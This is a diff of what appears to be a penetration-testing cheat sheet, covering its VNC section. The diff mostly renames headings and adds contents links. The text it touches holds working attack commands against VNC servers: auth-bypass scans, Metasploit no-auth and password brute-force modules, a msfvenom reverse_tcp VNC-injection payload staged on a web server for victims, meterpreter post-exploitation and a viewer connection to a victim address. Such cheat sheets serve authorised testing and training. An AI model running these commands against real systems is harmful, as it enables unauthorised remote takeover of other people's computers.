@@ -32,6 +32,13 @@
 - [SMB](#SMB)
 - [Redis](#Redis)
 - [VNC](#VNC)
+  - [VNC nmap scan](#VNC_nmap)
+  - [VNC exploit](#VNC_exploit)
+  - [MSF VNC auth none](#MSF_VNC_auth_none
+  - [MSF VNC password attack](#MSF_VNC_password_attack)
+  - [MSFVenom VNC payload](#MSFVenom_VNC_payload)
+  - [VNC post exploitation](#VNC_post_exploitation)
+  - [VNC_access](#VNC_access)
 - [Webdav](#Webdav)
   - [webdav_scanner](#webdav_scanner)
   - [metasploit](#metasploit)
@@ -716,19 +723,17 @@ ssh -i id_rsa redis@<victim_ip>
 # VNC
 Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 
 
-### nmap scan with nse script
+## VNC_nmap_scan
 ```
 nmap -sV --script realvnc-auth-bypass.nse [victim_ip] -p 5900
 
 nmap --script vnc-info [victim_ip] -p 5901
 ```
-
-### Authentication Bypass exploit (version RealVNC 4.1.0/4.1.1)
+## VNC_exploit
 ```
 https://www.exploit-db.com/exploits/36932
 ```
-
-### MSF VNC auth check with none scanner
+## MSF_VNC_auth_none
 ```
 msf > use auxiliary/scanner/vnc/vnc_none_auth
 msf > set RHOSTS [target_ip]
@@ -736,7 +741,7 @@ msf > set THREADS [int]
 msf > run
 ```
 
-### MSF VNC Password attack
+## MSF_VNC_password_attack
 ```
 msf > use auxiliary/scanner/vnc/vnc_login
 msf > set rhosts [victim_ip]
@@ -745,7 +750,7 @@ msf > set pass_file /your/dictionary/file
 msf > run
 ```
 
-### MSFVenom VNC payload
+## MSFVenom_VNC_payload
 ```
 msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe
 
@@ -757,12 +762,12 @@ msf > set viewonly false
 msf > run
 ```
 
-### VNC Post Exploitation
+## VNC_post_exploitation
 ```
 meterpreter > run vnc
 ```
 
-### VNC access
+## VNC_access
 ```
 sudo apt install tigervnc-viewer
 vncviewer [victim_ip]:[victim_port]
